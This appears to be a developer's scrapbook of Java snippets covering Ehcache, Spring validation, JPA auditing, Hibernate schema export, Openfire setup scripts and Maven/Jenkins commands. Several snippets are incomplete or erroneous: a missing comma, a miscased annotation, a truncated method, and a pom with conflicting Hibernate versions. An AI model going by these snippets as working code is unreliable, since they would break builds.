            http://www.ehcache.org/v3 http://www.ehcache.org/schema/ehcache-core-3.0.xsd
            http://www.ehcache.org/v3/jsr107 http://www.ehcache.org/schema/ehcache-107-ext-3.0.xsd">

    <cache alias="squareCache">
        <key-type>java.lang.Long</key-type>
        <value-type>java.math.BigDecimal</value-type>
        <expiry>
            <ttl unit="seconds">30</ttl>
        </expiry>

        <listeners>
            <listener>
                <class>com.baeldung.cachetest.config.CacheEventLogger</class>
                <event-firing-mode>ASYNCHRONOUS</event-firing-mode>
                <event-ordering-mode>UNORDERED</event-ordering-mode>
                <events-to-fire-on>CREATED</events-to-fire-on>
                <events-to-fire-on>EXPIRED</events-to-fire-on>
            </listener>
        </listeners>

        <resources>
            <heap unit="entries">2</heap>
            <offheap unit="MB">10</offheap>
        </resources>
    </cache>

</config>
--------------------------------------------------------------------------------------------------------
apply plugin: 'java'
apply plugin: 'eclipse-wtp'
 
version = '1.0'

// Uses JDK 7
sourceCompatibility = 1.7
targetCompatibility = 1.7

// Get dependencies from Maven central repository
repositories {
	mavenCentral()
}

//Project dependencies
dependencies {
	compile 'org.springframework:spring-context:4.1.4.RELEASE'
	compile 'org.springframework:spring-context-support:4.1.4.RELEASE'
	compile 'net.sf.ehcache:ehcache:2.9.0'
	compile 'ch.qos.logback:logback-classic:1.0.13'
}
--------------------------------------------------------------------------------------------------------
@CacheResult(cacheName="books", exceptionCacheName="failures"
            cachedExceptions = InvalidIsbnNotFoundException.class)
public Book findBook(ISBN isbn)
--------------------------------------------------------------------------------------------------------
@RequestMapping(value = "stepOne")
public String stepOne(@Validated(Account.ValidationStepOne.class) Account account) {...}

@RequestMapping(value = "stepTwo")
public String stepTwo(@Validated(Account.ValidationStepTwo.class) Account account) {...}

public class Account {

    @NotBlank(groups = {ValidationStepOne.class})
    private String username;

    @Email(groups = {ValidationStepOne.class})
    @NotBlank(groups = {ValidationStepOne.class})
    private String email;

    @NotBlank(groups = {ValidationStepTwo.class})
    @StrongPassword(groups = {ValidationStepTwo.class})
    private String password;

    @NotBlank(groups = {ValidationStepTwo.class})
    private String confirmedPassword;

}
--------------------------------------------------------------------------------------------------------
LocalDate date = LocalDate.of(2015, 8, 11);
TypedQuery query = this.em.createQuery("SELECT e FROM MyEntity e WHERE date BETWEEN :start AND :end", MyEntity.class);
query.setParameter("start", date.minusDays(2));
query.setParameter("end", date.plusDays(7));
MyEntity e = query.getSingleResult();

https://thoughts-on-java.org/persist-localdate-localdatetime-jpa/
--------------------------------------------------------------------------------------------------------
https://github.com/spring-projects/spring-data-examples/tree/master/jpa/example/src/main/java/example/springdata/jpa/auditing
--------------------------------------------------------------------------------------------------------
import org.hibernate.annotations.Type;
import org.springframework.data.annotation.CreatedBy;
import org.springframework.data.annotation.CreatedDate;
import org.springframework.data.annotation.LastModifiedBy;
import org.springframework.data.annotation.LastModifiedDate;
import org.springframework.data.jpa.domain.support.AuditingEntityListener;
 
import javax.persistence.Column;
import javax.persistence.Entity;
import javax.persistence.EntityListeners;
import javax.persistence.GeneratedValue;
import javax.persistence.GenerationType;
import javax.persistence.Id;
import javax.persistence.Table;
import javax.persistence.Version;
import java.time.ZonedDateTime;
 
@Entity
@EntityListeners(AuditingEntityListener.class)
@Table(name = "todos")
final class Todo {
 
    @Id
    @GeneratedValue(strategy = GenerationType.AUTO)
    private Long id;
 
    @Column(name = "created_by_user", nullable = false)
    @CreatedBy
    private String createdByUser;
 
    @Column(name = "creation_time", nullable = false)
    @Type(type = "org.jadira.usertype.dateandtime.threeten.PersistentZonedDateTime")
    @CreatedDate
    private ZonedDateTime creationTime;
 
    @Column(name = "description", length = 500)
    private String description;
 
    @Column(name = "modified_by_user", nullable = false)
    @LastModifiedBy
    private String modifiedByUser;
 
    @Column(name = "modification_time")
    @Type(type = "org.jadira.usertype.dateandtime.threeten.PersistentZonedDateTime")
    @LastModifiedDate
    private ZonedDateTime modificationTime;
 
    @Column(name = "title", nullable = false, length = 100)
    private String title;
 
    @Version
    private long version;
}
--------------------------------------------------------------------------------------------------------
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.data.auditing.DateTimeProvider;
import org.springframework.data.domain.AuditorAware;
import org.springframework.data.jpa.repository.config.EnableJpaAuditing;
import org.springframework.data.jpa.repository.config.EnableJpaRepositories;
import org.springframework.transaction.annotation.EnableTransactionManagement;
  
  
@Configuration
@EnableJpaAuditing(dateTimeProviderRef = "dateTimeProvider")
@EnableJpaRepositories(basePackages = {
        "net.petrikainulainen.springdata.jpa.todo"
})
@EnableTransactionManagement
class PersistenceContext {
 
    @Bean
    AuditorAware<String> auditorProvider() {
        return new UsernameAuditorAware();
    }
  
    @Bean
    DateTimeProvider dateTimeProvider(DateTimeService dateTimeService) {
        return new AuditingDateTimeProvider(dateTimeService);
    
--------------------------------------------------------------------------------------------------------
import org.hibernate.annotations.Type;
import org.springframework.data.annotation.CreatedBy;
import org.springframework.data.annotation.CreatedDate;
import org.springframework.data.annotation.LastModifiedBy;
import org.springframework.data.annotation.LastModifiedDate;
import org.springframework.data.jpa.domain.support.AuditingEntityListener;
 
import javax.persistence.Column;
import javax.persistence.MappedSuperClass
 
@EntityListeners(AuditingEntityListener.class)
@MappedSuperClass
public abstract class BaseEntity {
  
    @Column(name = "created_by_user", nullable = false)
    @CreatedBy
    private String createdByUser;
     
    @Column(name = "creation_time", nullable = false)
    @Type(type = "org.jadira.usertype.dateandtime.threeten.PersistentZonedDateTime")
    @CreatedDate
    private ZonedDateTime creationTime; 
  
    @Column(name = "modified_by_user", nullable = false)
    @LastModifiedBy
    private String modifiedByUser;
     
    @Column(name = "modification_time")
    @Type(type = "org.jadira.usertype.dateandtime.threeten.PersistentZonedDateTime")
    @LastModifiedDate
    private ZonedDateTime modificationTime;
}
--------------------------------------------------------------------------------------------------------
    <!--  entity manager -->
    <bean id="entityManagerFactory" class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
        <property name="dataSource" ref="dataSource"/>
        <property name="jpaVendorAdapter" ref="hibernateJpaVendorAdapter"/>
        <property name="packagesToScan" value="com.ia.domain"/>
        <property name="jpaProperties">
            <props>
                <prop key="hibernate.dialect">org.hibernate.dialect.MySQL5InnoDBDialect</prop>
                <prop key="hibernate.query.substitutions">true '1', false '0'</prop>
                <prop key="hibernate.generate_statistics">true</prop>
                <prop key="hibernate.show_sql">false</prop>
                <prop key="hibernate.format_sql">true</prop>
                <prop key="hibernate.hbm2ddl.auto">update</prop>
                <prop key="hibernate.ejb.naming_strategy">org.hibernate.cfg.ImprovedNamingStrategy</prop>
                <prop key="hibernate.connection.charSet">UTF-8</prop>
            </props>
        </property>
    </bean>
--------------------------------------------------------------------------------------------------------
@EntityListeners({AuditingEntityListener.class})
@Entity
public class User
{

  @TableGenerator(name="UUIDGenerator", pkColumnValue="user_id", table="uuid_generator", allocationSize=1)
  @Id
  @GeneratedValue(strategy=GenerationType.TABLE, generator="UUIDGenerator")
  @Column(name="id")
  private Long id;

  @NotNull
  private String username;

  @CreatedDate
  @NotNull
  @Temporal(TemporalType.TIMESTAMP)
  @Column(name="created_date", nullable=false)
  private Date createdDate;

  @LastModifiedDate
  @NotNull
  @Temporal(TemporalType.TIMESTAMP)
  @Column(name="last_modified_date", nullable=false)
  private Date lastModifiedDate;

  @CreatedBy
  @ManyToOne(fetch=FetchType.LAZY)
  @JoinColumn(name="created_by")
  private User createdBy;

  @LastModifiedBy
  @ManyToOne(fetch=FetchType.LAZY)
  @JoinColumn(name="last_modified_by")
  private User lastModifiedBy;
  private String password;
  private Boolean enabled;


...
}
--------------------------------------------------------------------------------------------------------
@Configurable
public class TimestampedEntityAuditListener {

    @PrePersist
    public void touchForCreate(AbstractTimestampedEntity target) {
        Date now = new Date();
        target.setCreated(now);
        target.setUpdated(now);
    }

    @PreUpdate
    public void touchForUpdate(AbstractTimestampedEntity target) {
        target.setUpdated(new Date());
    }
}

@MappedSuperclass
@EntityListeners({TimestampedEntityAuditListener.class})
public abstract class AbstractTimestampedEntity implements Serializable {

    @Id
    @GeneratedValue(strategy = GenerationType.TABLE)
    private Long id;

    @Temporal(TemporalType.TIMESTAMP)
    private Date created;

    @Temporal(TemporalType.TIMESTAMP)
    private Date updated;

    public Date getCreated() {
        return created;
    }

    public void setCreated(Date created) {
        this.created = created;
    }

    public Date getUpdated() {
        return updated;
    }

    public void setUpdated(Date updated) {
        this.updated = updated;
    }

    public Long getId() {
        return id;
    }

    public void setId(Long id) {
        this.id = id;
    }
}

@ManyToOne ( fetch=FetchType.LAZY )

                
@MappedSuperclass
@SuppressWarnings("serial")
public class AbstractAuditableEntity extends AbstractPersistable<Integer> implements Auditable<String, Integer> {

    private DateTime lastUpdated;
    private String lastUpdateUser;
    private DateTime created;
    private String createUser;
    
    /**
     * Gets created by audit user.
     */
    @Override
    public String getCreatedBy() {
        return createUser;
    }

    /**
     * Sets created by audit user.
     */
    @Override
    public void setCreatedBy(String createdBy) {
        this.createUser = createdBy;
    }
    
    /**
     * Gets create audit date.
     */    
    @Override
    public DateTime getCreatedDate() {
        return created;
    }

    /**
     * Sets create audit date.
     */    
    @Override
    public void setCreatedDate(DateTime creationDate) {
        this.created = creationDate;
    }

    /**
     * Gets last modified by audit user.
     */
    @Override
    public String getLastModifiedBy() {
        return lastUpdateUser;
    }
    
    /**
     * Sets last modified by audit user.
     */
    @Override
    public void setLastModifiedBy(String lastModifiedBy) {
        this.lastUpdateUser = lastModifiedBy;
    }

    /**
     * Gets last modified audit date.
     */    
    @Override
    public DateTime getLastModifiedDate() {
        return lastUpdated;
    }

    /**
     * Sets last modified audit date.
     */    
    @Override
    public void setLastModifiedDate(DateTime lastModifiedDate) {
        this.lastUpdated = lastModifiedDate;
    }

}
     
--------------------------------------------------------------------------------------------------------
@Entity
public class User {
    @Id
    Long id;
 
    @Column(columnDefinition = "varchar(255) default 'John Snow'")
    private String name;
 
    @Column(columnDefinition = "integer default 25")
    private Integer age;
 
    @Column(columnDefinition = "boolean default false")
    private Boolean locked;
}
--------------------------------------------------------------------------------------------------------
import java.io.File;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import org.hibernate.cfg.Configuration;
import org.hibernate.tool.hbm2ddl.SchemaExport;

public class SchemaGenerator {

    private Configuration cfg;

    public static void main(String[] args) throws Exception {

        File f = new File(".");
        String directory = f.getAbsoluteFile() + "/src/main/resources/ddl/generated/";

        String packageName[] = { "com.mypackage.jpa", "com.mypackage.jpa.legacy", "com.mypackage.jpa.local",
                "com.mypackage.jpa.local.impl" };

        SchemaGenerator gen = new SchemaGenerator(packageName);
        gen.generate(Dialect.MYSQL, directory);

    }

    @SuppressWarnings("rawtypes")
    public SchemaGenerator(String[] packagesName) throws Exception {
        cfg = new Configuration();
        cfg.setProperty("hibernate.hbm2ddl.auto", "create");

        for (String packageName : packagesName) {
            for (Class clazz : getClasses(packageName)) {
                cfg.addAnnotatedClass(clazz);
            }
        }
    }

    @SuppressWarnings("rawtypes")
    private List<Class> getClasses(String packageName) throws Exception {
        File directory = null;
        try {
            ClassLoader cld = getClassLoader();
            URL resource = getResource(packageName, cld);
            directory = new File(resource.getFile());
        } catch (NullPointerException ex) {
            throw new ClassNotFoundException(packageName + " (" + directory + ") does not appear to be a valid package");
        }
        return collectClasses(packageName, directory);
    }

    private ClassLoader getClassLoader() throws ClassNotFoundException {
        ClassLoader cld = Thread.currentThread().getContextClassLoader();
        if (cld == null) {
            throw new ClassNotFoundException("Can't get class loader.");
        }
        return cld;
    }

    private URL getResource(String packageName, ClassLoader cld) throws ClassNotFoundException {
        String path = packageName.replace('.', '/');
        URL resource = cld.getResource(path);
        if (resource == null) {
            throw new ClassNotFoundException("No resource for " + path);
        }
        return resource;
    }

    @SuppressWarnings("rawtypes")
    private List<Class> collectClasses(String packageName, File directory) throws ClassNotFoundException {
        List<Class> classes = new ArrayList<>();
        if (directory.exists()) {
            String[] files = directory.list();
            for (String file : files) {
                if (file.endsWith(".class")) {
                    // removes the .class extension
                    classes.add(Class.forName(packageName + '.' + file.substring(0, file.length() - 6)));
                }
            }
        } else {
            throw new ClassNotFoundException(packageName + " is not a valid package");
        }
        return classes;
    }

    private void generate(Dialect dialect, String directory) {
        cfg.setProperty("hibernate.dialect", dialect.getDialectClass());
        SchemaExport export = new SchemaExport(cfg);
        export.setDelimiter(";");
        export.setOutputFile(directory + "ddl_" + dialect.name().toLowerCase() + ".sql");
        export.setFormat(true);
        export.execute(true, false, false, false);
    }

    private static enum Dialect {
        ORACLE("org.hibernate.dialect.Oracle10gDialect"), MYSQL("org.hibernate.dialect.MySQLDialect"), HSQL(
                "org.hibernate.dialect.HSQLDialect"), H2("org.hibernate.dialect.H2Dialect");

        private String dialectClass;

        private Dialect(String dialectClass) {
            this.dialectClass = dialectClass;
        }

        public String getDialectClass() {
            return dialectClass;
        }
    }
}
--------------------------------------------------------------------------------------------------------
java -Duser.timezone=UTC ...
--------------------------------------------------------------------------------------------------------
public static class CurrentUser {

	public static final CurrentUser INSTANCE = new CurrentUser();

	private static final ThreadLocal<String> storage = new ThreadLocal<>();

	public void logIn(String user) {
		storage.set( user );
	}

	public void logOut() {
		storage.remove();
	}

	public String get() {
		return storage.get();
	}
}

public static class LoggedUserGenerator implements ValueGenerator<String> {

	@Override
	public String generateValue(
			Session session, Object owner) {
		return CurrentUser.INSTANCE.get();
	}
}
--------------------------------------------------------------------------------------------------------\
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-actuator</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-data-jpa</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-data-mongodb</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-data-mongodb-reactive</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-jdbc</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-mail</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-thymeleaf</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>

    <dependency>
        <groupId>mysql</groupId>
        <artifactId>mysql-connector-java</artifactId>
        <scope>runtime</scope>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-test</artifactId>
        <scope>test</scope>
    </dependency>
    <dependency>
        <groupId>de.flapdoodle.embed</groupId>
        <artifactId>de.flapdoodle.embed.mongo</artifactId>
        <scope>test</scope>
    </dependency>
    <dependency>
        <groupId>org.hibernate</groupId>
        <artifactId>hibernate-entitymanager</artifactId>
        <version>5.2.16.Final</version>
    </dependency>
    <dependency>
        <groupId>org.hibernate</groupId>
        <artifactId>hibernate-search-orm</artifactId>
        <version>4.5.1.Final</version>
    </dependency>
    <dependency>
        <groupId>org.hibernate</groupId>
        <artifactId>hibernate-core</artifactId>
        <version>4.1.4.Final</version>
    </dependency>
    <dependency>
        <groupId>org.hibernate</groupId>
        <artifactId>hibernate-entitymanager</artifactId>
        <version>5.2.3.Final</version>
    </dependency>
</dependencies>
--------------------------------------------------------------------------------------------------------
/* $Revision:  $ */
/* $Date:  $ */

CREATE TABLE jiveSASLAuthorized (
  username            NVARCHAR(64)   NOT NULL,
  principal           NVARCHAR(4000) NOT NULL,
  CONSTRAINT jiveSASLAuthoirzed_pk PRIMARY KEY (username, principal)
);

UPDATE jiveVersion set version=10 where name = 'openfire';


/* $Revision:  $  */
/* $Date:  $      */

CREATE TABLE jiveSASLAuthorized (
  username        NVARCHAR(64)     NOT NULL,
  principal       NVARCHAR(2000)   NOT NULL,
  CONSTRAINT jiveSASLAuthoirzed_pk PRIMARY KEY (username, principal)
);

UPDATE jiveVersion set version=10 where name = 'openfire';

-- $Revision:  $
-- $Date:  $

CREATE TABLE jiveSASLAuthorized (
  username            VARCHAR(64)   NOT NULL,
  principal           VARCHAR(4000) NOT NULL,
  CONSTRAINT jiveSASLAuthoirzed_pk PRIMARY KEY (username, principal)
);

UPDATE jiveVersion set version=10 where name = 'openfire';

# $Revision:  $
# $Date:  $

CREATE TABLE jiveSASLAuthorized (
  username            VARCHAR(64)   NOT NULL,
  principal           TEXT          NOT NULL,
  PRIMARY KEY (username, principal(200))
);

UPDATE jiveVersion set version=10 where name = 'openfire';

// $Revision:  $
// $Date:  $

CREATE TABLE jiveSASLAuthorized (
  username        VARCHAR(64)      NOT NULL,
  principal       VARCHAR(4000)    NOT NULL,
  CONSTRAINT jiveSASLAuthorized_pk PRIMARY KEY (username, principal)
);

UPDATE jiveVersion set version=10 where name = 'openfire';

-- $Revision:  $
-- $Date:  $

CREATE TABLE jiveSASLAuthorized (
  username            VARCHAR(64)   NOT NULL,
  principal           VARCHAR(4000) NOT NULL,
  CONSTRAINT jiveSASLAuthorized_pk PRIMARY KEY (username, principal)
);

UPDATE jiveVersion set version=10 where name = 'openfire';

/sbin/chkconfig --add openfired
/sbin/chkconfig openfired on
--------------------------------------------------------------------------------------------------------
@echo off

REM #
REM # $RCSfile$
REM # $Revision: 1102 $
REM # $Date: 2005-03-07 22:36:48 -0300 (Mon, 07 Mar 2005) $
REM #

REM # Starts Openfire in development mode, which means that JSP pages in the admin console will
REM # be compiled dynamically out of the web src directory. This makes it much easier to admin
REM # console development.

REM # Development mode also works for plugins so that plugin JSP pages are compiled dynamically.
REM # Hot swapping of class files is optionally supported. The two params to control these features
REM # are [pluginName].webRoot and [pluginName].classes. See the plugin developer guide for
REM # additional information.

REM  SET PLUGIN_WEBROOT=foo.webRoot=c:\plugins\foo\src\web
REM  SET PLUGIN_CLASSES=foo.classes=c:\plugins\foo\target\classes



if "%JAVA_HOME%" == "" goto javaerror
if not exist "%JAVA_HOME%\bin\java.exe" goto javaerror
set OPENFIRE_HOME=%CD%\..
goto run

:javaerror
echo.
echo Error: JAVA_HOME environment variable not set, Openfire not started.
echo.
goto end

:run
if "%1" == "-debug" goto debug
start "Openfire" "%JAVA_HOME%\bin\java" -DopenfireHome="%OPENFIRE_HOME%" -DdevelopmentMode="true" -server -cp "%JAVA_HOME%\lib\tools.jar;..\..\..\build\lib\ant.jar;..\..\..\build\lib\ant-contrib.jar;..\lib\slf4j-log4j12.jar;..\lib\bouncycastle.jar;..\lib\commons-el.jar;..\lib\hsqldb.jar;..\lib\jasper-compiler.jar;..\lib\jasper-runtime.jar;..\lib\jtds.jar;..\lib\mail.jar;..\lib\mysql.jar;..\lib\postgres.jar;..\lib\servlet.jar;..\lib\startup.jar;..\lib\openfire.jar" org.jivesoftware.openfire.starter.ServerStarter
goto end

:debug
start "Openfire" "%JAVA_HOME%\bin\java" -DopenfireHome="%OPENFIRE_HOME%" -Xdebug -Xint -Xnoagent -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000 -DdevelopmentMode="true" -D%PLUGIN_WEBROOT% -D%PLUGIN_CLASSES% -server -cp "%JAVA_HOME%\lib\tools.jar;..\..\..\build\lib\ant.jar;..\..\..\build\lib\ant-contrib.jar;..\lib\bouncycastle.jar;..\lib\commons-el.jar;..\lib\hsqldb.jar;..\lib\jasper-compiler.jar;..\lib\jasper-runtime.jar;..\lib\jtds.jar;..\lib\mail.jar;..\lib\mysql.jar;..\lib\postgres.jar;..\lib\servlet-api.jar;..\lib\startup.jar;..\lib\openfire.jar" org.jivesoftware.openfire.starter.ServerStarter
goto end
:end
--------------------------------------------------------------------------------------------------------
#!/bin/sh

#
# $RCSfile$
# $Revision: 1194 $
# $Date: 2005-03-30 13:39:54 -0300 (Wed, 30 Mar 2005) $
#

# tries to determine arguments to launch openfire

# OS specific support.  $var _must_ be set to either true or false.
cygwin=false;
darwin=false;
linux=false;
case "`uname`" in
  CYGWIN*) cygwin=true ;;
  Darwin*) darwin=true
           if [ -z "$JAVA_HOME" ] ; then
             JAVA_HOME=/System/Library/Frameworks/JavaVM.framework/Home
           fi
           ;;
  Linux*) linux=true
          if [ -z "$JAVA_HOME" ]; then
              shopt -s nullglob
              jdks=`ls -r1d /usr/java/j* /usr/lib/jvm/* 2>/dev/null`
              for jdk in $jdks; do
                if [ -f "$jdk/bin/java" ]; then
                  JAVA_HOME="$jdk"
                  break
                fi
              done
          fi
          ;;
esac

#if openfire home is not set or is not a directory
if [ -z "$OPENFIRE_HOME" -o ! -d "$OPENFIRE_HOME" ]; then

	if [ -d /opt/openfire ] ; then
		OPENFIRE_HOME="/opt/openfire"
	fi

	if [ -d /usr/local/openfire ] ; then
		OPENFIRE_HOME="/usr/local/openfire"
	fi

	if [ -d ${HOME}/opt/openfire ] ; then
		OPENFIRE_HOME="${HOME}/opt/openfire"
	fi

	#resolve links - $0 may be a link in openfire's home
	PRG="$0"
	progname=`basename "$0$"`

	# need this for relative symlinks

	# need this for relative symlinks
  	while [ -h "$PRG" ] ; do
    		ls=`ls -ld "$PRG"`
    		link=`expr "$ls" : '.*-> \(.*\)$'`
    		if expr "$link" : '/.*' > /dev/null; then
    			PRG="$link"
    		else
    			PRG=`dirname "$PRG"`"/$link"
    		fi
  	done

	#assumes we are in the bin directory
	OPENFIRE_HOME=`dirname "$PRG"`/..

	#make it fully qualified
	OPENFIRE_HOME=`cd "$OPENFIRE_HOME" && pwd`
fi
OPENFIRE_OPTS="${OPENFIRE_OPTS} -DopenfireHome=\"${OPENFIRE_HOME}\""


# For Cygwin, ensure paths are in UNIX format before anything is touched
if $cygwin ; then
	[ -n "$OPENFIRE_HOME" ] &&
    		OPENFIRE_HOME=`cygpath --unix "$OPENFIRE_HOME"`
  	[ -n "$JAVA_HOME" ] &&
    		JAVA_HOME=`cygpath --unix "$JAVA_HOME"`
fi

#set the OPENFIRE_LIB location
OPENFIRE_LIB="${OPENFIRE_HOME}/lib"
OPENFIRE_OPTS="${OPENFIRE_OPTS} -Dopenfire.lib.dir=\"${OPENFIRE_LIB}\""

# Override with bundled jre if it exists.
if [ -f "$OPENFIRE_HOME/jre/bin/java" ]; then
	JAVA_HOME="$OPENFIRE_HOME/jre"
	JAVACMD="$OPENFIRE_HOME/jre/bin/java"
fi

if [ -z "$JAVACMD" ] ; then
  	if [ -n "$JAVA_HOME"  ] ; then
    		if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
      			# IBM's JDK on AIX uses strange locations for the executables
      			JAVACMD="$JAVA_HOME/jre/sh/java"
    		else
      			JAVACMD="$JAVA_HOME/bin/java"
    		fi
  	else
    		JAVACMD=`which java 2> /dev/null `
    		if [ -z "$JAVACMD" ] ; then
        		JAVACMD=java
    		fi
  	fi
fi

if [ ! -x "$JAVACMD" ] ; then
  	echo "Error: JAVA_HOME is not defined correctly."
  	echo "  We cannot execute $JAVACMD"
  	exit 1
fi

for arguments in "$@"
do
case $arguments in
    -debug)
    JAVACMD="$JAVACMD -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005"
    ;;
    *)
	# unknown option
    ;;
esac
done


if [ -z "$LOCALCLASSPATH" ] ; then
	LOCALCLASSPATH=$OPENFIRE_LIB/startup.jar
else
      	LOCALCLASSPATH=$OPENFIRE_LIB/startup.jar:$LOCALCLASSPATH
fi

# For Cygwin, switch paths to appropriate format before running java
if $cygwin; then
  	if [ "$OS" = "Windows_NT" ] && cygpath -m .>/dev/null 2>/dev/null ; then
    		format=mixed
  	else
    		format=windows
  	fi
  	OPENFIRE_HOME=`cygpath --$format "$OPENFIRE_HOME"`
  	OPENFIRE_LIB=`cygpath --$format "$OPENFIRE_LIB"`
  	JAVA_HOME=`cygpath --$format "$JAVA_HOME"`
  	LOCALCLASSPATH=`cygpath --path --$format "$LOCALCLASSPATH"`
  	if [ -n "$CLASSPATH" ] ; then
    		CLASSPATH=`cygpath --path --$format "$CLASSPATH"`
  	fi
  	CYGHOME=`cygpath --$format "$HOME"`
fi

# add a second backslash to variables terminated by a backslash under cygwin
if $cygwin; then
  case "$OPENFIRE_HOME" in
    *\\ )
    OPENFIRE_HOME="$OPENFIRE_HOME\\"
    ;;
  esac
  case "$CYGHOME" in
    *\\ )
    CYGHOME="$CYGHOME\\"
    ;;
  esac
  case "$LOCALCLASSPATH" in
    *\\ )
    LOCALCLASSPATH="$LOCALCLASSPATH\\"
    ;;
  esac
  case "$CLASSPATH" in
    *\\ )
    CLASSPATH="$CLASSPATH\\"
    ;;
  esac
fi

openfire_exec_command="exec $JAVACMD -server $OPENFIRE_OPTS -classpath \"$LOCALCLASSPATH\" -jar \"$OPENFIRE_LIB/startup.jar\""
eval $openfire_exec_command
--------------------------------------------------------------------------------------------------------
/**
 * The Class UserEntity.
 */
@XmlRootElement(name = "user")
@XmlType(propOrder = { "username", "name", "email", "password", "properties" })
public class UserEntity {

}
--------------------------------------------------------------------------------------------------------
import javax.xml.bind.DatatypeConverter;

public class BasicAuth {
	/**
	 * Decode the basic auth and convert it to array login/password
	 * 
	 * @param auth
	 *            The string encoded authentification
	 * @return The login (case 0), the password (case 1)
	 */
	public static String[] decode(String auth) {
		// Replacing "Basic THE_BASE_64" to "THE_BASE_64" directly
		auth = auth.replaceFirst("[B|b]asic ", "");

		// Decode the Base64 into byte[]
		byte[] decodedBytes = DatatypeConverter.parseBase64Binary(auth);

		// If the decode fails in any case
		if (decodedBytes == null || decodedBytes.length == 0) {
			return null;
		}

		// Now we can convert the byte[] into a splitted array :
		// - the first one is login,
		// - the second one password
		return new String(decodedBytes).split(":", 2);
	}
}
--------------------------------------------------------------------------------------------------------
https://j2html.com/

C:\Program Files (x86)\EMS\SQL Manager Lite for PostgreSQL\Dump\pg_dump96.exe -h localhost -p 5432 -U distributor -F p -E UTF8 -C --inserts --column-inserts -v -f "C:\Users\Alex\Documents\test2.sql" distributor_db

--
-- TOC entry 2170 (class 1262 OID 73728)
-- Name: distributor_db; Type: DATABASE; Schema: -; Owner: postgres
--

CREATE DATABASE distributor_db WITH TEMPLATE = template0 ENCODING = 'UTF8' LC_COLLATE = 'English_United States.1252' LC_CTYPE = 'English_United States.1252';


ALTER DATABASE distributor_db OWNER TO postgres;
--------------------------------------------------------------------------------------------------------
private static String PROP_DB_DRIVER_CLASS = "spring.db.driver";
private static String PROP_DB_URL = "spring.datasource.url";
private static String PROP_DB_USER = "spring.datasource.username";
private static String PROP_DB_PASS = "spring.datasource.password";

@Autowired
private Environment env;

@Bean
public DataSource dataSource(){
      DriverManagerDataSource dataSource = new DriverManagerDataSource();
      dataSource.setDriverClassName(env.getProperty(PROP_DB_DRIVER_CLASS));
      dataSource.setUrl(env.getProperty(PROP_DB_URL));
      dataSource.setUsername(env.getProperty(PROP_DB_USER));
      dataSource.setPassword(env.getProperty(PROP_DB_PASS));
      return dataSource;
}

@Bean
public LocalContainerEntityManagerFactoryBean entityManagerFactory() {
      LocalContainerEntityManagerFactoryBean em = new LocalContainerEntityManagerFactoryBean();
      em.setDataSource(dataSource());
      em.setPackagesToScan("com.sweng.giflib.model");

      JpaVendorAdapter vendorAdapter = new HibernateJpaVendorAdapter();
      em.setJpaVendorAdapter(vendorAdapter);
      em.setJpaProperties(additionalProperties());

      return em;
}
--------------------------------------------------------------------------------------------------------
git pull
mvn -B -Djava.net.id=drulli -Dusername=drulli release:prepare release:perform -Dlocale=de

mvn deploy:deploy-file -Durl=http://maven.jenkins-ci.org:8081/content/repositories/releases/ -DrepositoryId=java.net-m2-repository -Dfile=findbugs-full-2.0.0-dev-20101217.jar -DpomFile=upload-pom.xml


rm -rf $JENKINS_HOME/plugins/findbugs*

mvn install || { echo "Build failed"; exit 1; }

cp -f target/*.hpi $JENKINS_HOME/plugins/
cd $JENKINS_HOME
./go.sh


export MAVEN_OPTS="-Xmx1024m -Xdebug -Xrunjdwp:transport=dt_socket,server=y,address=8000,suspend=n"
rm -rf $JENKINS_HOME/plugins/findbugs*
mvn clean hpi:run
--------------------------------------------------------------------------------------------------------
  private static final String PROPERTIES_RESOURCE =
      "/META-INF/maven/com.google.errorprone/error_prone_core/pom.properties";
  public static Optional<String> loadVersionFromPom() {
    try (InputStream stream = ErrorProneVersion.class.getResourceAsStream(PROPERTIES_RESOURCE)) {
      if (stream == null) {
        return Optional.absent();
      }
      Properties mavenProperties = new Properties();
      mavenProperties.load(stream);
      return Optional.of(mavenProperties.getProperty("version"));
    } catch (IOException expected) {
      return Optional.absent();
    }
  }
--------------------------------------------------------------------------------------------------------

import com.strobel.assembler.metadata.ClasspathTypeLoader;
import com.strobel.assembler.metadata.CompositeTypeLoader;
import com.strobel.assembler.metadata.ITypeLoader;
import com.strobel.assembler.metadata.JarTypeLoader;
import one.util.huntbugs.analysis.AnalysisOptions;
import one.util.huntbugs.analysis.Context;
import one.util.huntbugs.analysis.HuntBugsResult;
import one.util.huntbugs.input.XmlReportReader;
import one.util.huntbugs.output.Reports;
import one.util.huntbugs.repo.AuxRepository;
import one.util.huntbugs.repo.CompositeRepository;
import one.util.huntbugs.repo.DirRepository;
import one.util.huntbugs.repo.Repository;
import one.util.huntbugs.warning.Warning;
import org.apache.maven.artifact.Artifact;
import org.apache.maven.artifact.repository.ArtifactRepository;
import org.apache.maven.artifact.resolver.filter.ArtifactFilter;
import org.apache.maven.artifact.resolver.filter.ScopeArtifactFilter;
import org.apache.maven.execution.MavenSession;
import org.apache.maven.plugin.AbstractMojo;
import org.apache.maven.plugin.MojoExecutionException;
import org.apache.maven.plugin.MojoFailureException;
import org.apache.maven.plugins.annotations.Component;
import org.apache.maven.plugins.annotations.LifecyclePhase;
import org.apache.maven.plugins.annotations.Mojo;
